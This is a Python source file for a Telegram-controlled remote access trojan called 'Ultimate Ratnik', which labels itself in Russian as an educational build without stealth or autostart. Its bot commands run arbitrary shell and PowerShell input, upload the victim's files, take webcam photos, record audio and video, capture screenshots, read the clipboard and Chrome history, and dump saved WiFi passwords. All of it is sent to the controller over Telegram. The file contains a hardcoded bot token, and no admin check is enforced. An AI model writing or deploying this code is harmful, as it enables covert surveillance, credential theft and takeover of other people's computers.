# -*- coding: utf-8 -*-
import time
import logging
import subprocess
import sys
import os
import threading
import psutil
import socket
import platform
import shutil
import json
import zipfile
from datetime import datetime
import urllib.request

# ЯВНО показываем окно
print("🛡️ Ultimate Ratnik - Учебный бот запущен")
print("Окно активно - бот работает в обычном режиме")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ratnik.log'),
        logging.StreamHandler()
    ]
)

TOKEN = "8156787432:AAHPrJI2Bc6wNo4sy93bsrxv558V5M1fwhI"
ADMIN_IDS = []

class UltimateRatnikBot:
    def __init__(self):
        self.application = None
        self.stealth_mode = False  # Отключен скрытный режим
        self.keylogger_active = False
        self.screen_monitor = False
        self.setup_bot()
        
    def setup_bot(self):
        try:
            from telegram.ext import Application, CommandHandler, MessageHandler, filters
            self.application = Application.builder().token(TOKEN).build()
            self.setup_handlers()
        except ImportError:
            self.install_dependencies()
    
    def setup_handlers(self):
        from telegram.ext import CommandHandler, MessageHandler, filters
        
        # Безопасные команды (убраны stealth функции)
        commands = [
            # Системные команды
            CommandHandler("start", self.start),
            CommandHandler("status", self.status),
            CommandHandler("info", self.system_info),
            CommandHandler("cmd", self.execute_command),
            CommandHandler("powershell", self.execute_powershell),
            CommandHandler("processes", self.list_processes),
            CommandHandler("kill", self.kill_process),
            CommandHandler("service", self.manage_service),
            
            # Файловые операции
            CommandHandler("files", self.list_files),
            CommandHandler("download", self.download_file),
            CommandHandler("upload", self.upload_file),
            CommandHandler("search", self.search_files),
            CommandHandler("delete", self.delete_file),
            CommandHandler("copy", self.copy_file),
            CommandHandler("move", self.move_file),
            CommandHandler("zip", self.zip_files),
            CommandHandler("unzip", self.unzip_file),
            
            # Медиа функции
            CommandHandler("screenshot", self.take_screenshot),
            CommandHandler("webcam", self.take_webcam_photo),
            CommandHandler("audio", self.record_audio),
            CommandHandler("video", self.record_video),
            CommandHandler("camera_list", self.list_cameras),
            
            # Мониторинг
            CommandHandler("monitor_start", self.start_monitoring),
            CommandHandler("monitor_stop", self.stop_monitoring),
            CommandHandler("clipboard", self.get_clipboard),
            CommandHandler("browser_history", self.get_browser_history),
            
            # Сеть
            CommandHandler("network", self.network_info),
            CommandHandler("wifi", self.get_wifi_passwords),
            CommandHandler("ports", self.check_ports),
            CommandHandler("ip", self.get_ip_info),
            CommandHandler("traceroute", self.traceroute),
            
            # Безопасность (только информационные)
            CommandHandler("antivirus", self.antivirus_info),
            CommandHandler("firewall", self.firewall_status),
            
            # Управление системой
            CommandHandler("shutdown", self.shutdown),
            CommandHandler("restart", self.restart),
            CommandHandler("lock", self.lock_pc),
            CommandHandler("message", self.show_message),
            CommandHandler("beep", self.system_beep),
            CommandHandler("wallpaper", self.change_wallpaper),
            
            # Информация
            CommandHandler("myid", self.get_my_id),
            CommandHandler("help", self.show_help),
        ]
        
        for handler in commands:
            self.application.add_handler(handler)
        
        # Обработчик документов
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.upload_file))
    
    # 1-10: СИСТЕМНЫЕ КОМАНДЫ
    async def start(self, update, context):
        user = update.effective_user
        await update.message.reply_text(
            f"🛡️ Ultimate Ratnik - Учебная версия\n"
            f"User: {user.first_name} | ID: {user.id}\n"
            f"Без автозагрузки и скрытности\n"
            "Type /help for commands list"
        )
    
    async def status(self, update, context):
        status_info = f"""
🖥️ System Status:
CPU: {psutil.cpu_percent()}% | Memory: {psutil.virtual_memory().percent}%
Disk: {psutil.disk_usage('/').percent}% | Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Stealth: 🔴 OFF | Автозагрузка: 🔴 OFF
        """
        await update.message.reply_text(status_info)
    
    async def system_info(self, update, context):
        info = f"""
💻 System Information:
OS: {platform.system()} {platform.release()} {platform.architecture()[0]}
CPU: {platform.processor()}
RAM: {psutil.virtual_memory().total//1024//1024}MB
Disk: {psutil.disk_usage('/').total//1024//1024//1024}GB
Hostname: {socket.gethostname()}
IP: {socket.gethostbyname(socket.gethostname())}
        """
        await update.message.reply_text(info)
    
    async def execute_command(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /cmd <command>")
            return
        
        command = ' '.join(context.args)
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            await update.message.reply_text(f"💻 Output:\n{output[:3000]}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def execute_powershell(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /powershell <script>")
            return
        
        script = ' '.join(context.args)
        try:
            result = subprocess.run(["powershell", "-Command", script], 
                                  capture_output=True, text=True, timeout=30)
            output = result.stdout if result.stdout else result.stderr
            await update.message.reply_text(f"🔧 PowerShell:\n{output[:3000]}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def list_processes(self, update, context):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except psutil.NoSuchProcess:
                    pass
            
            processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
            response = "📊 Top processes:\n"
            for proc in processes[:15]:
                response += f"PID: {proc['pid']} | {proc['name'][:20]} | CPU: {proc['cpu_percent'] or 0:.1f}% | MEM: {proc['memory_percent'] or 0:.1f}%\n"
            
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def kill_process(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /kill <PID>")
            return
        
        try:
            pid = int(context.args[0])
            process = psutil.Process(pid)
            process_name = process.name()
            process.terminate()
            await update.message.reply_text(f"✅ Killed {process_name} (PID: {pid})")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def manage_service(self, update, context):
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: /service <start|stop|restart> <service_name>")
            return
        
        action, service_name = context.args[0], ' '.join(context.args[1:])
        try:
            if platform.system() == "Windows":
                result = subprocess.run(f"net {action} {service_name}", shell=True, capture_output=True, text=True)
                await update.message.reply_text(f"✅ Service {action}: {service_name}\n{result.stdout}")
            else:
                await update.message.reply_text("❌ Windows only")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    # 11-20: ФАЙЛОВЫЕ ОПЕРАЦИИ
    async def list_files(self, update, context):
        path = ' '.join(context.args) if context.args else os.getcwd()
        try:
            files = os.listdir(path)
            response = f"📁 {path}:\n"
            for file in files[:20]:
                full_path = os.path.join(path, file)
                icon = "📁" if os.path.isdir(full_path) else "📄"
                size = os.path.getsize(full_path) if os.path.isfile(full_path) else 0
                response += f"{icon} {file} ({size} bytes)\n"
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def download_file(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /download <file_path>")
            return
        
        file_path = ' '.join(context.args)
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    await update.message.reply_document(document=file, filename=os.path.basename(file_path))
            else:
                await update.message.reply_text("❌ File not found")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
    
    async def upload_file(self, update, context):
        if not update.message.document:
            await update.message.reply_text("❌ Send file as document")
            return
        
        try:
            file = await update.message.document.get_file()
            file_name = update.message.document.file_name
            await file.download_to_drive(file_name)
            await update.message.reply_text(f"✅ Uploaded: {file_name}")
        except Exception as e:
            await update.message.reply_text(f"❌ Upload error: {str(e)}")
    
    async def search_files(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /search <filename>")
            return
        
        search_term = ' '.join(context.args)
        try:
            found_files = []
            for root, dirs, files in os.walk(os.getcwd()):
                for file in files:
                    if search_term.lower() in file.lower():
                        found_files.append(os.path.join(root, file))
                if len(found_files) >= 10:
                    break
            
            response = f"🔍 Found {len(found_files)} files:\n"
            for file in found_files[:10]:
                response += f"📄 {file}\n"
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"❌ Search error: {str(e)}")
    
    async def delete_file(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /delete <file_path>")
            return
        
        file_path = ' '.join(context.args)
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                await update.message.reply_text(f"✅ Deleted: {file_path}")
            else:
                await update.message.reply_text("❌ File not found")
        except Exception as e:
            await update.message.reply_text(f"❌ Delete error: {str(e)}")
    
    async def copy_file(self, update, context):
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: /copy <source> <destination>")
            return
        
        src, dst = context.args[0], ' '.join(context.args[1:])
        try:
            shutil.copy2(src, dst)
            await update.message.reply_text(f"✅ Copied: {src} -> {dst}")
        except Exception as e:
            await update.message.reply_text(f"❌ Copy error: {str(e)}")
    
    async def move_file(self, update, context):
        if len(context.args) < 2:
            await update.message.reply_text("❌ Usage: /move <source> <destination>")
            return
        
        src, dst = context.args[0], ' '.join(context.args[1:])
        try:
            shutil.move(src, dst)
            await update.message.reply_text(f"✅ Moved: {src} -> {dst}")
        except Exception as e:
            await update.message.reply_text(f"❌ Move error: {str(e)}")
    
    async def zip_files(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /zip <file1> <file2> ...")
            return
        
        try:
            zip_name = "archive.zip"
            with zipfile.ZipFile(zip_name, 'w') as zipf:
                for file in context.args:
                    if os.path.exists(file):
                        zipf.write(file)
            
            with open(zip_name, 'rb') as zip_file:
                await update.message.reply_document(document=zip_file, filename=zip_name)
            
            os.remove(zip_name)
        except Exception as e:
            await update.message.reply_text(f"❌ Zip error: {str(e)}")
    
    async def unzip_file(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /unzip <zip_file>")
            return
        
        zip_file = ' '.join(context.args)
        try:
            with zipfile.ZipFile(zip_file, 'r') as zipf:
                zipf.extractall()
            await update.message.reply_text(f"✅ Unzipped: {zip_file}")
        except Exception as e:
            await update.message.reply_text(f"❌ Unzip error: {str(e)}")
    
    # 21-30: МЕДИА ФУНКЦИИ
    async def take_screenshot(self, update, context):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            screenshot.save("screenshot.png")
            with open("screenshot.png", "rb") as photo:
                await update.message.reply_photo(photo=photo, caption="📸 Screenshot")
            os.remove("screenshot.png")
        except Exception as e:
            await update.message.reply_text(f"❌ Screenshot error: {str(e)}")
    
    async def take_webcam_photo(self, update, context):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                with open('webcam.jpg', 'rb') as photo:
                    await update.message.reply_photo(photo=photo, caption="📷 Webcam")
                os.remove('webcam.jpg')
            cap.release()
        except Exception as e:
            await update.message.reply_text(f"❌ Webcam error: {str(e)}")
    
    async def record_audio(self, update, context):
        duration = int(context.args[0]) if context.args else 5
        try:
            import sounddevice as sd
            import numpy as np
            import wave
            
            await update.message.reply_text(f"🎙️ Recording {duration}s...")
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            
            with wave.open('audio.wav', 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes((recording * 32767).astype(np.int16).tobytes())
            
            with open('audio.wav', 'rb') as audio:
                await update.message.reply_audio(audio=audio, title=f"Audio {duration}s")
            
            os.remove('audio.wav')
        except Exception as e:
            await update.message.reply_text(f"❌ Audio error: {str(e)}")
    
    async def record_video(self, update, context):
        duration = int(context.args[0]) if context.args else 10
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('video.avi', fourcc, 20.0, (640, 480))
            
            start_time = time.time()
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
            
            cap.release()
            out.release()
            
            with open('video.avi', 'rb') as video:
                await update.message.reply_video(video=video, caption="🎥 Video recording")
            
            os.remove('video.avi')
        except Exception as e:
            await update.message.reply_text(f"❌ Video error: {str(e)}")
    
    async def list_cameras(self, update, context):
        try:
            import cv2
            index = 0
            cameras = []
            while True:
                cap = cv2.VideoCapture(index)
                if not cap.read()[0]:
                    break
                else:
                    cameras.append(f"Camera {index}")
                cap.release()
                index += 1
                if index > 10:
                    break
            
            await update.message.reply_text(f"📹 Cameras found: {', '.join(cameras)}")
        except Exception as e:
            await update.message.reply_text(f"❌ Camera error: {str(e)}")
    
    # 31-40: МОНИТОРИНГ И СЕТЬ
    async def start_monitoring(self, update, context):
        self.screen_monitor = True
        await update.message.reply_text("🟢 Screen monitoring started")
    
    async def stop_monitoring(self, update, context):
        self.screen_monitor = False
        await update.message.reply_text("🔴 Screen monitoring stopped")
    
    async def get_clipboard(self, update, context):
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await update.message.reply_text(f"📋 Clipboard: {data[:1000]}")
        except:
            await update.message.reply_text("❌ Clipboard error")
    
    async def get_browser_history(self, update, context):
        try:
            # Chrome history
            history_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                      'Google', 'Chrome', 'User Data', 'Default', 'History')
            if os.path.exists(history_path):
                import sqlite3
                conn = sqlite3.connect(history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
                history = cursor.fetchall()
                
                response = "🌐 Browser History:\n"
                for url, title in history:
                    response += f"🔗 {title}: {url}\n"
                
                await update.message.reply_text(response)
            else:
                await update.message.reply_text("❌ Chrome not found")
        except Exception as e:
            await update.message.reply_text(f"❌ History error: {str(e)}")
    
    async def network_info(self, update, context):
        try:
            interfaces = psutil.net_if_addrs()
            stats = psutil.net_io_counters()
            
            response = "🌐 Network Info:\n"
            for interface, addrs in list(interfaces.items())[:5]:
                response += f"📡 {interface}:\n"
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        response += f"  IP: {addr.address}\n"
            
            response += f"📊 Sent: {stats.bytes_sent//1024}KB | Received: {stats.bytes_recv//1024}KB"
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"❌ Network error: {str(e)}")
    
    async def get_wifi_passwords(self, update, context):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                      capture_output=True, text=True)
                profiles = [line.split(":")[1].strip() for line in result.stdout.split('\n') 
                           if "All User Profile" in line]
                
                wifi_info = "📶 WiFi Passwords:\n"
                for profile in profiles[:5]:
                    try:
                        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], 
                                              capture_output=True, text=True)
                        password_line = [line.split(":")[1].strip() for line in result.stdout.split('\n') 
                                       if "Key Content" in line]
                        password = password_line[0] if password_line else "No password"
                        wifi_info += f"📡 {profile}: {password}\n"
                    except:
                        continue
                
                await update.message.reply_text(wifi_info)
            else:
                await update.message.reply_text("❌ Windows only")
        except Exception as e:
            await update.message.reply_text(f"❌ WiFi error: {str(e)}")
    
    # Безопасность (только информационные)
    async def check_ports(self, update, context):
        try:
            response = "🔌 Open ports:\n"
            for conn in psutil.net_connections(kind='inet')[:10]:
                if conn.status == 'LISTEN' and conn.laddr:
                    response += f"Port {conn.laddr.port} ({conn.status})\n"
            await update.message.reply_text(response)
        except Exception as e:
            await update.message.reply_text(f"❌ Port error: {str(e)}")
    
    async def get_ip_info(self, update, context):
        try:
            external_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
            await update.message.reply_text(f"🌍 External IP: {external_ip}")
        except:
            await update.message.reply_text("❌ IP check failed")
    
    async def traceroute(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /traceroute <host>")
            return
        
        host = context.args[0]
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['tracert', '-h', '5', host], capture_output=True, text=True)
            else:
                result = subprocess.run(['traceroute', '-m', '5', host], capture_output=True, text=True)
            
            await update.message.reply_text(f"🛣️ Traceroute to {host}:\n{result.stdout[:2000]}")
        except Exception as e:
            await update.message.reply_text(f"❌ Traceroute error: {str(e)}")
    
    async def antivirus_info(self, update, context):
        try:
            # Check common AV processes
            av_processes = ['avp', 'avast', 'bitdefender', 'kaspersky', 'norton', 'mcafee']
            running_av = []
            for proc in psutil.process_iter(['name']):
                if any(av in proc.info['name'].lower() for av in av_processes):
                    running_av.append(proc.info['name'])
            
            if running_av:
                await update.message.reply_text(f"🛡️ Antivirus detected: {', '.join(running_av)}")
            else:
                await update.message.reply_text("✅ No antivirus detected")
        except Exception as e:
            await update.message.reply_text(f"❌ AV check error: {str(e)}")
    
    async def firewall_status(self, update, context):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'], 
                                      capture_output=True, text=True)
                await update.message.reply_text(f"🔥 Firewall status:\n{result.stdout[:2000]}")
            else:
                await update.message.reply_text("❌ Windows only")
        except Exception as e:
            await update.message.reply_text(f"❌ Firewall error: {str(e)}")
    
    # Управление системой
    async def shutdown(self, update, context):
        await update.message.reply_text("🔄 Shutting down...")
        if platform.system() == "Windows":
            os.system("shutdown /s /t 5")
        else:
            os.system("shutdown -h now")
    
    async def restart(self, update, context):
        await update.message.reply_text("🔄 Restarting...")
        if platform.system() == "Windows":
            os.system("shutdown /r /t 5")
        else:
            os.system("reboot")
    
    async def lock_pc(self, update, context):
        await update.message.reply_text("🔒 Locking PC...")
        if platform.system() == "Windows":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        else:
            await update.message.reply_text("❌ Windows only")
    
    async def show_message(self, update, context):
        if not context.args:
            await update.message.reply_text("❌ Usage: /message <text>")
            return
        
        message = ' '.join(context.args)
        try:
            if platform.system() == "Windows":
                os.system(f'msg * "{message}"')
                await update.message.reply_text("✅ Message sent")
            else:
                await update.message.reply_text("❌ Windows only")
        except Exception as e:
            await update.message.reply_text(f"❌ Message error: {str(e)}")
    
    async def system_beep(self, update, context):
        try:
            import winsound
            winsound.Beep(1000, 1000)  # Frequency, Duration
            await update.message.reply_text("🔊 Beep played")
        except:
            await update.message.reply_text("❌ Beep error")
    
    async def change_wallpaper(self, update, context):
        try:
            if platform.system() == "Windows":
                import ctypes
                # Simple color change
                ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
                await update.message.reply_text("🖼️ Wallpaper changed")
            else:
                await update.message.reply_text("❌ Windows only")
        except Exception as e:
            await update.message.reply_text(f"❌ Wallpaper error: {str(e)}")
    
    async def get_my_id(self, update, context):
        user_id = update.effective_user.id
        await update.message.reply_text(f"🆔 Your ID: {user_id}")
    
    async def show_help(self, update, context):
        help_text = """
🛡️ Ultimate Ratnik - Учебная версия

🔧 SYSTEM:
/start /status /info /cmd /powershell
/processes /kill /service

📁 FILES:
/files /download /upload /search /delete
/copy /move /zip /unzip

🎥 MEDIA:
/screenshot /webcam /audio /video /camera_list

🌐 NETWORK:
/network /wifi /ports /ip /traceroute

🔐 SECURITY:
/antivirus /firewall

⚙️ CONTROL:
/shutdown /restart /lock /message
/beep /wallpaper /myid /help

🚫 Убрано: автозагрузка, скрытность, кейлоггер
"""
        await update.message.reply_text(help_text)
    
    def install_dependencies(self):
        packages = [
            "python-telegram-bot", "psutil", "pillow", 
            "opencv-python", "sounddevice", "numpy",
            "pywin32"
        ]
        for package in packages:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"✅ Установлено: {package}")
            except:
                print(f"❌ Ошибка установки: {package}")
        print("🔄 Перезапуск...")
        os.execv(sys.executable, [sys.executable] + sys.argv)
    
    def run(self):
        print("🛡️ Ultimate Ratnik запущен в обычном режиме")
        print("📝 Окно активно - бот работает")
        self.application.run_polling()

def main():
    # Всегда показываем окно
    print("=" * 50)
    print("🛡️ ULTIMATE RATNIK - УЧЕБНАЯ ВЕРСИЯ")
    print("✅ Без автозагрузки")
    print("✅ Без скрытности") 
    print("✅ Без кейлоггера")
    print("=" * 50)
    
    while True:
        try:
            bot = UltimateRatnikBot()
            bot.run()
        except Exception as e:
            print(f"❌ Ошибка: {e}. Перезапуск через 10 секунд...")
            time.sleep(10)

if __name__ == "__main__":
    main()